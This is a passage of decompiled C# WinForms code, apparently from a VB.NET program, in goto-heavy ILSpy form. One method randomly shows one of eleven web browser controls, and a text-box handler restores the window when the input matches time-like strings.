							goto IL_0685;
						case 113:
							goto IL_0694;
						case 114:
							goto IL_06a3;
						case 115:
							goto IL_06b2;
						case 116:
							goto IL_06c1;
						case 117:
							goto IL_06d0;
						case 118:
							goto IL_06df;
						case 119:
							goto IL_06ee;
						case 120:
						case 121:
							goto IL_06fd;
						case 122:
							goto IL_071b;
						case 123:
							goto IL_072a;
						case 124:
							goto IL_0739;
						case 125:
							goto IL_0748;
						case 126:
							goto IL_0757;
						case 127:
							goto IL_0766;
						case 128:
							goto IL_0775;
						case 129:
							goto IL_0787;
						case 130:
							goto IL_0799;
						case 131:
							goto IL_07ab;
						case 132:
							goto IL_07bd;
						case 133:
						case 134:
							goto IL_07cf;
						case 135:
							goto IL_07f0;
						case 136:
							goto IL_0802;
						case 137:
							goto IL_0814;
						case 138:
							goto IL_0826;
						case 139:
							goto IL_0838;
						case 140:
							goto IL_084a;
						case 141:
							goto IL_085c;
						case 142:
							goto IL_086e;
						case 143:
							goto IL_0880;
						case 144:
							goto IL_0892;
						case 145:
							goto IL_08a4;
						case 146:
						case 147:
							goto IL_08b6;
						case 148:
							goto IL_08d7;
						case 149:
							goto IL_08e9;
						case 150:
							goto IL_08fb;
						case 151:
							goto IL_090d;
						case 152:
							goto IL_091f;
						case 153:
							goto IL_0931;
						case 154:
							goto IL_0943;
						case 155:
							goto IL_0955;
						case 156:
							goto IL_0967;
						case 157:
							goto IL_0979;
						case 158:
							goto IL_098b;
						case 159:
						case 160:
							goto IL_099d;
						case 161:
							goto IL_09be;
						case 162:
							goto IL_09d0;
						case 163:
							goto IL_09e2;
						case 164:
							goto IL_09f4;
						case 165:
							goto IL_0a06;
						case 166:
							goto IL_0a18;
						case 167:
							goto IL_0a2a;
						case 168:
							goto IL_0a3c;
						case 169:
							goto IL_0a4e;
						case 170:
							goto IL_0a60;
						case 171:
							goto IL_0a72;
						case 172:
						case 173:
							goto IL_0a84;
						case 174:
							goto IL_0aa5;
						case 175:
							goto IL_0ab7;
						case 176:
							goto IL_0ac9;
						case 177:
							goto IL_0adb;
						case 178:
							goto IL_0aed;
						case 179:
							goto IL_0aff;
						case 180:
							goto IL_0b11;
						case 181:
							goto IL_0b23;
						case 182:
							goto IL_0b35;
						case 183:
							goto IL_0b47;
						case 184:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 185:
						case 186:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0b47:
					num = 183;
					((Control)WebBrowser10).set_Visible(false);
					break;
					IL_0b35:
					num = 182;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_0b47;
					IL_0009:
					num = 2;
					random = new Random();
					goto IL_0011;
					IL_0011:
					num = 3;
					n = Conversions.ToString(random.Next(1, 12));
					goto IL_0027;
					IL_0027:
					num = 4;
					if (Conversions.ToDouble(n) == 0.0)
					{
						goto IL_0044;
					}
					goto IL_00e5;
					IL_0044:
					num = 5;
					((Control)WebBrowser1).set_Visible(true);
					goto IL_0052;
					IL_0052:
					num = 6;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_0060;
					IL_0060:
					num = 7;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_006e;
					IL_006e:
					num = 8;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_007c;
					IL_007c:
					num = 9;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_008b;
					IL_008b:
					num = 10;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_009a;
					IL_009a:
					num = 11;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_00a9;
					IL_00a9:
					num = 12;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_00b8;
					IL_00b8:
					num = 13;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_00c7;
					IL_00c7:
					num = 14;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_00d6;
					IL_00d6:
					num = 15;
					((Control)WebBrowser11).set_Visible(false);
					goto IL_00e5;
					IL_00e5:
					num = 17;
					if (Conversions.ToDouble(n) == 1.0)
					{
						goto IL_0103;
					}
					goto IL_01a8;
					IL_0103:
					num = 18;
					((Control)WebBrowser1).set_Visible(true);
					goto IL_0112;
					IL_0112:
					num = 19;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_0121;
					IL_0121:
					num = 20;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_0130;
					IL_0130:
					num = 21;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_013f;
					IL_013f:
					num = 22;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_014e;
					IL_014e:
					num = 23;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_015d;
					IL_015d:
					num = 24;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_016c;
					IL_016c:
					num = 25;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_017b;
					IL_017b:
					num = 26;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_018a;
					IL_018a:
					num = 27;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_0199;
					IL_0199:
					num = 28;
					((Control)WebBrowser11).set_Visible(false);
					goto IL_01a8;
					IL_01a8:
					num = 30;
					if (Conversions.ToDouble(n) == 2.0)
					{
						goto IL_01c6;
					}
					goto IL_026b;
					IL_01c6:
					num = 31;
					((Control)WebBrowser2).set_Visible(true);
					goto IL_01d5;
					IL_01d5:
					num = 32;
					((Control)WebBrowser1).set_Visible(false);
					goto IL_01e4;
					IL_01e4:
					num = 33;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_01f3;
					IL_01f3:
					num = 34;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_0202;
					IL_0202:
					num = 35;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_0211;
					IL_0211:
					num = 36;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_0220;
					IL_0220:
					num = 37;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_022f;
					IL_022f:
					num = 38;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_023e;
					IL_023e:
					num = 39;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_024d;
					IL_024d:
					num = 40;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_025c;
					IL_025c:
					num = 41;
					((Control)WebBrowser11).set_Visible(false);
					goto IL_026b;
					IL_026b:
					num = 43;
					if (Conversions.ToDouble(n) == 3.0)
					{
						goto IL_0289;
					}
					goto IL_032e;
					IL_0289:
					num = 44;
					((Control)WebBrowser3).set_Visible(true);
					goto IL_0298;
					IL_0298:
					num = 45;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_02a7;
					IL_02a7:
					num = 46;
					((Control)WebBrowser1).set_Visible(false);
					goto IL_02b6;
					IL_02b6:
					num = 47;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_02c5;
					IL_02c5:
					num = 48;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_02d4;
					IL_02d4:
					num = 49;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_02e3;
					IL_02e3:
					num = 50;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_02f2;
					IL_02f2:
					num = 51;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_0301;
					IL_0301:
					num = 52;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_0310;
					IL_0310:
					num = 53;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_031f;
					IL_031f:
					num = 54;
					((Control)WebBrowser11).set_Visible(false);
					goto IL_032e;
					IL_032e:
					num = 56;
					if (Conversions.ToDouble(n) == 4.0)
					{
						goto IL_034c;
					}
					goto IL_03f1;
					IL_034c:
					num = 57;
					((Control)WebBrowser4).set_Visible(true);
					goto IL_035b;
					IL_035b:
					num = 58;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_036a;
					IL_036a:
					num = 59;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_0379;
					IL_0379:
					num = 60;
					((Control)WebBrowser1).set_Visible(false);
					goto IL_0388;
					IL_0388:
					num = 61;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_0397;
					IL_0397:
					num = 62;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_03a6;
					IL_03a6:
					num = 63;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_03b5;
					IL_03b5:
					num = 64;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_03c4;
					IL_03c4:
					num = 65;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_03d3;
					IL_03d3:
					num = 66;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_03e2;
					IL_03e2:
					num = 67;
					((Control)WebBrowser11).set_Visible(false);
					goto IL_03f1;
					IL_03f1:
					num = 69;
					if (Conversions.ToDouble(n) == 5.0)
					{
						goto IL_040f;
					}
					goto IL_04b4;
					IL_040f:
					num = 70;
					((Control)WebBrowser5).set_Visible(true);
					goto IL_041e;
					IL_041e:
					num = 71;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_042d;
					IL_042d:
					num = 72;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_043c;
					IL_043c:
					num = 73;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_044b;
					IL_044b:
					num = 74;
					((Control)WebBrowser1).set_Visible(false);
					goto IL_045a;
					IL_045a:
					num = 75;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_0469;
					IL_0469:
					num = 76;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_0478;
					IL_0478:
					num = 77;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_0487;
					IL_0487:
					num = 78;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_0496;
					IL_0496:
					num = 79;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_04a5;
					IL_04a5:
					num = 80;
					((Control)WebBrowser11).set_Visible(false);
					goto IL_04b4;
					IL_04b4:
					num = 82;
					if (Conversions.ToDouble(n) == 6.0)
					{
						goto IL_04d2;
					}
					goto IL_0577;
					IL_04d2:
					num = 83;
					((Control)WebBrowser6).set_Visible(true);
					goto IL_04e1;
					IL_04e1:
					num = 84;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_04f0;
					IL_04f0:
					num = 85;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_04ff;
					IL_04ff:
					num = 86;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_050e;
					IL_050e:
					num = 87;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_051d;
					IL_051d:
					num = 88;
					((Control)WebBrowser1).set_Visible(false);
					goto IL_052c;
					IL_052c:
					num = 89;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_053b;
					IL_053b:
					num = 90;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_054a;
					IL_054a:
					num = 91;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_0559;
					IL_0559:
					num = 92;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_0568;
					IL_0568:
					num = 93;
					((Control)WebBrowser11).set_Visible(false);
					goto IL_0577;
					IL_0577:
					num = 95;
					if (Conversions.ToDouble(n) == 7.0)
					{
						goto IL_0595;
					}
					goto IL_063a;
					IL_0595:
					num = 96;
					((Control)WebBrowser7).set_Visible(true);
					goto IL_05a4;
					IL_05a4:
					num = 97;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_05b3;
					IL_05b3:
					num = 98;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_05c2;
					IL_05c2:
					num = 99;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_05d1;
					IL_05d1:
					num = 100;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_05e0;
					IL_05e0:
					num = 101;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_05ef;
					IL_05ef:
					num = 102;
					((Control)WebBrowser1).set_Visible(false);
					goto IL_05fe;
					IL_05fe:
					num = 103;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_060d;
					IL_060d:
					num = 104;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_061c;
					IL_061c:
					num = 105;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_062b;
					IL_062b:
					num = 106;
					((Control)WebBrowser11).set_Visible(false);
					goto IL_063a;
					IL_063a:
					num = 108;
					if (Conversions.ToDouble(n) == 8.0)
					{
						goto IL_0658;
					}
					goto IL_06fd;
					IL_0658:
					num = 109;
					((Control)WebBrowser8).set_Visible(true);
					goto IL_0667;
					IL_0667:
					num = 110;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_0676;
					IL_0676:
					num = 111;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_0685;
					IL_0685:
					num = 112;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_0694;
					IL_0694:
					num = 113;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_06a3;
					IL_06a3:
					num = 114;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_06b2;
					IL_06b2:
					num = 115;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_06c1;
					IL_06c1:
					num = 116;
					((Control)WebBrowser1).set_Visible(false);
					goto IL_06d0;
					IL_06d0:
					num = 117;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_06df;
					IL_06df:
					num = 118;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_06ee;
					IL_06ee:
					num = 119;
					((Control)WebBrowser11).set_Visible(false);
					goto IL_06fd;
					IL_06fd:
					num = 121;
					if (Conversions.ToDouble(n) == 9.0)
					{
						goto IL_071b;
					}
					goto IL_07cf;
					IL_071b:
					num = 122;
					((Control)WebBrowser9).set_Visible(true);
					goto IL_072a;
					IL_072a:
					num = 123;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_0739;
					IL_0739:
					num = 124;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_0748;
					IL_0748:
					num = 125;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_0757;
					IL_0757:
					num = 126;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_0766;
					IL_0766:
					num = 127;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_0775;
					IL_0775:
					num = 128;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_0787;
					IL_0787:
					num = 129;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_0799;
					IL_0799:
					num = 130;
					((Control)WebBrowser1).set_Visible(false);
					goto IL_07ab;
					IL_07ab:
					num = 131;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_07bd;
					IL_07bd:
					num = 132;
					((Control)WebBrowser11).set_Visible(false);
					goto IL_07cf;
					IL_07cf:
					num = 134;
					if (Conversions.ToDouble(n) == 10.0)
					{
						goto IL_07f0;
					}
					goto IL_08b6;
					IL_07f0:
					num = 135;
					((Control)WebBrowser10).set_Visible(true);
					goto IL_0802;
					IL_0802:
					num = 136;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_0814;
					IL_0814:
					num = 137;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_0826;
					IL_0826:
					num = 138;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_0838;
					IL_0838:
					num = 139;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_084a;
					IL_084a:
					num = 140;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_085c;
					IL_085c:
					num = 141;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_086e;
					IL_086e:
					num = 142;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_0880;
					IL_0880:
					num = 143;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_0892;
					IL_0892:
					num = 144;
					((Control)WebBrowser1).set_Visible(false);
					goto IL_08a4;
					IL_08a4:
					num = 145;
					((Control)WebBrowser11).set_Visible(false);
					goto IL_08b6;
					IL_08b6:
					num = 147;
					if (Conversions.ToDouble(n) == 11.0)
					{
						goto IL_08d7;
					}
					goto IL_099d;
					IL_08d7:
					num = 148;
					((Control)WebBrowser11).set_Visible(true);
					goto IL_08e9;
					IL_08e9:
					num = 149;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_08fb;
					IL_08fb:
					num = 150;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_090d;
					IL_090d:
					num = 151;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_091f;
					IL_091f:
					num = 152;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_0931;
					IL_0931:
					num = 153;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_0943;
					IL_0943:
					num = 154;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_0955;
					IL_0955:
					num = 155;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_0967;
					IL_0967:
					num = 156;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_0979;
					IL_0979:
					num = 157;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_098b;
					IL_098b:
					num = 158;
					((Control)WebBrowser1).set_Visible(false);
					goto IL_099d;
					IL_099d:
					num = 160;
					if (Conversions.ToDouble(n) == 12.0)
					{
						goto IL_09be;
					}
					goto IL_0a84;
					IL_09be:
					num = 161;
					((Control)WebBrowser11).set_Visible(true);
					goto IL_09d0;
					IL_09d0:
					num = 162;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_09e2;
					IL_09e2:
					num = 163;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_09f4;
					IL_09f4:
					num = 164;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_0a06;
					IL_0a06:
					num = 165;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_0a18;
					IL_0a18:
					num = 166;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_0a2a;
					IL_0a2a:
					num = 167;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_0a3c;
					IL_0a3c:
					num = 168;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_0a4e;
					IL_0a4e:
					num = 169;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_0a60;
					IL_0a60:
					num = 170;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_0a72;
					IL_0a72:
					num = 171;
					((Control)WebBrowser1).set_Visible(false);
					goto IL_0a84;
					IL_0a84:
					num = 173;
					if (Conversions.ToDouble(n) != 13.0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0aa5;
					IL_0aa5:
					num = 174;
					((Control)WebBrowser11).set_Visible(true);
					goto IL_0ab7;
					IL_0ab7:
					num = 175;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_0ac9;
					IL_0ac9:
					num = 176;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_0adb;
					IL_0adb:
					num = 177;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_0aed;
					IL_0aed:
					num = 178;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_0aff;
					IL_0aff:
					num = 179;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_0b11;
					IL_0b11:
					num = 180;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_0b23;
					IL_0b23:
					num = 181;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_0b35;
					end_IL_0001_2:
					break;
				}
				num = 184;
				((Control)WebBrowser1).set_Visible(false);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 3688;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void TextBox1_TextChanged(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 2685:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0036;
						case 4:
							goto IL_003f;
						case 5:
						case 6:
							goto IL_0067;
						case 7:
							goto IL_0094;
						case 8:
							goto IL_009d;
						case 9:
						case 10:
							goto IL_00c5;
						case 11:
							goto IL_00f3;
						case 12:
						case 13:
							goto IL_00fd;
						case 14:
							goto IL_012b;
						case 15:
							goto IL_0135;
						case 16:
						case 17:
							goto IL_015e;
						case 18:
							goto IL_018c;
						case 19:
							goto IL_0196;
						case 20:
						case 21:
							goto IL_01bf;
						case 22:
							goto IL_01ed;
						case 23:
							goto IL_01f7;
						case 24:
						case 25:
							goto IL_0220;
						case 26:
							goto IL_024e;
						case 27:
							goto IL_0258;
						case 28:
						case 29:
							goto IL_0281;
						case 30:
							goto IL_02af;
						case 31:
							goto IL_02b9;
						case 32:
						case 33:
							goto IL_02e2;
						case 34:
							goto IL_0310;
						case 35:
							goto IL_031a;
						case 36:
						case 37:
							goto IL_0343;
						case 38:
							goto IL_0371;
						case 39:
							goto IL_037b;
						case 40:
						case 41:
							goto IL_03a4;
						case 42:
							goto IL_03d2;
						case 43:
							goto IL_03dc;
						case 44:
						case 45:
							goto IL_0405;
						case 46:
							goto IL_0433;
						case 47:
							goto IL_043d;
						case 48:
						case 49:
							goto IL_0466;
						case 50:
							goto IL_0494;
						case 51:
							goto IL_049e;
						case 52:
						case 53:
							goto IL_04c7;
						case 54:
							goto IL_04f5;
						case 55:
							goto IL_04ff;
						case 56:
						case 57:
							goto IL_0528;
						case 58:
							goto IL_0556;
						case 59:
							goto IL_0560;
						case 60:
						case 61:
							goto IL_0589;
						case 62:
							goto IL_05b7;
						case 63:
							goto IL_05c1;
						case 64:
						case 65:
							goto IL_05ea;
						case 66:
							goto IL_0618;
						case 67:
							goto IL_0622;
						case 68:
						case 69:
							goto IL_064b;
						case 70:
							goto IL_0679;
						case 71:
							goto IL_0683;
						case 72:
						case 73:
							goto IL_06ac;
						case 74:
							goto IL_06da;
						case 75:
							goto IL_06e4;
						case 76:
						case 77:
							goto IL_070d;
						case 78:
							goto IL_073b;
						case 79:
							goto IL_0745;
						case 80:
						case 81:
							goto IL_076e;
						case 82:
							goto IL_079c;
						case 83:
							goto IL_07a6;
						case 84:
						case 85:
							goto IL_07cf;
						case 86:
							goto IL_07fd;
						case 87:
							goto IL_0807;
						case 88:
						case 89:
							goto IL_0830;
						case 90:
							goto IL_085e;
						case 91:
							goto IL_0868;
						case 92:
						case 93:
							goto IL_0891;
						case 94:
							goto IL_08bf;
						case 95:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 96:
						case 97:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_08bf:
					num = 94;
					((Form)this).set_WindowState((FormWindowState)0);
					break;
					IL_0891:
					num = 93;
					if (Operators.CompareString(TextBox1.get_Text(), "23." + Min + "2.15", false) != 0)
					{
						goto end_IL_0001_3;
					}
					goto IL_08bf;
					IL_0009:
					num = 2;
					if (Operators.CompareString(TextBox1.get_Text(), "00." + Min + "1.10", false) == 0)
					{
						goto IL_0036;
					}
					goto IL_0067;
					IL_0036:
					num = 3;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_003f;
					IL_003f:
					num = 4;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_0067;
					IL_0067:
					num = 6;
					if (Operators.CompareString(TextBox1.get_Text(), "01." + Min + "2.32", false) == 0)
					{
						goto IL_0094;
					}
					goto IL_00c5;
					IL_0094:
					num = 7;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_009d;
					IL_009d:
					num = 8;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_00c5;
					IL_00c5:
					num = 10;
					if (Operators.CompareString(TextBox1.get_Text(), "02." + Min + "4.34", false) == 0)
					{
						goto IL_00f3;
					}
					goto IL_00fd;
					IL_00f3:
					num = 11;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_00fd;
					IL_00fd:
					num = 13;
					if (Operators.CompareString(TextBox1.get_Text(), "03." + Min + "4.36", false) == 0)
					{
						goto IL_012b;
					}
					goto IL_015e;
					IL_012b:
					num = 14;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_0135;
					IL_0135:
					num = 15;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_015e;
					IL_015e:
					num = 17;
					if (Operators.CompareString(TextBox1.get_Text(), "04." + Min + "3.40", false) == 0)
					{
						goto IL_018c;
					}
					goto IL_01bf;
					IL_018c:
					num = 18;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_0196;
					IL_0196:
					num = 19;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_01bf;
					IL_01bf:
					num = 21;
					if (Operators.CompareString(TextBox1.get_Text(), "05." + Min + "5.11", false) == 0)
					{
						goto IL_01ed;
					}
					goto IL_0220;
					IL_01ed:
					num = 22;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_01f7;
					IL_01f7:
					num = 23;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_0220;
					IL_0220:
					num = 25;
					if (Operators.CompareString(TextBox1.get_Text(), "06." + Min + "1.22", false) == 0)
					{
						goto IL_024e;
					}
					goto IL_0281;
					IL_024e:
					num = 26;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_0258;
					IL_0258:
					num = 27;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_0281;
					IL_0281:
					num = 29;
					if (Operators.CompareString(TextBox1.get_Text(), "07." + Min + "1.33", false) == 0)
					{
						goto IL_02af;
					}
					goto IL_02e2;
					IL_02af:
					num = 30;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_02b9;
					IL_02b9:
					num = 31;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_02e2;
					IL_02e2:
					num = 33;
					if (Operators.CompareString(TextBox1.get_Text(), "08." + Min + "5.21", false) == 0)
					{
						goto IL_0310;
					}
					goto IL_0343;
					IL_0310:
					num = 34;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_031a;
					IL_031a:
					num = 35;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_0343;
					IL_0343:
					num = 37;
					if (Operators.CompareString(TextBox1.get_Text(), "09." + Min + "4.55", false) == 0)
					{
						goto IL_0371;
					}
					goto IL_03a4;
					IL_0371:
					num = 38;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_037b;
					IL_037b:
					num = 39;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_03a4;
					IL_03a4:
					num = 41;
					if (Operators.CompareString(TextBox1.get_Text(), "10." + Min + "3.44", false) == 0)
					{
						goto IL_03d2;
					}
					goto IL_0405;
					IL_03d2:
					num = 42;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_03dc;
					IL_03dc:
					num = 43;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_0405;
					IL_0405:
					num = 45;
					if (Operators.CompareString(TextBox1.get_Text(), "11." + Min + "2.48", false) == 0)
					{
						goto IL_0433;
					}
					goto IL_0466;
					IL_0433:
					num = 46;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_043d;
					IL_043d:
					num = 47;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_0466;
					IL_0466:
					num = 49;
					if (Operators.CompareString(TextBox1.get_Text(), "12." + Min + "2.23", false) == 0)
					{
						goto IL_0494;
					}
					goto IL_04c7;
					IL_0494:
					num = 50;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_049e;
					IL_049e:
					num = 51;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_04c7;
					IL_04c7:
					num = 53;
					if (Operators.CompareString(TextBox1.get_Text(), "13." + Min + "4.21", false) == 0)
					{
						goto IL_04f5;
					}
					goto IL_0528;
					IL_04f5:
					num = 54;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_04ff;
					IL_04ff:
					num = 55;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_0528;
					IL_0528:
					num = 57;
					if (Operators.CompareString(TextBox1.get_Text(), "14." + Min + "5.15", false) == 0)
					{
						goto IL_0556;
					}
					goto IL_0589;
					IL_0556:
					num = 58;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_0560;
					IL_0560:
					num = 59;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_0589;
					IL_0589:
					num = 61;
					if (Operators.CompareString(TextBox1.get_Text(), "15." + Min + "4.55", false) == 0)
					{
						goto IL_05b7;
					}
					goto IL_05ea;
					IL_05b7:
					num = 62;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_05c1;
					IL_05c1:
					num = 63;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_05ea;
					IL_05ea:
					num = 65;
					if (Operators.CompareString(TextBox1.get_Text(), "16." + Min + "1.23", false) == 0)
					{
						goto IL_0618;
					}
					goto IL_064b;
					IL_0618:
					num = 66;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_0622;
					IL_0622:
					num = 67;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_064b;
					IL_064b:
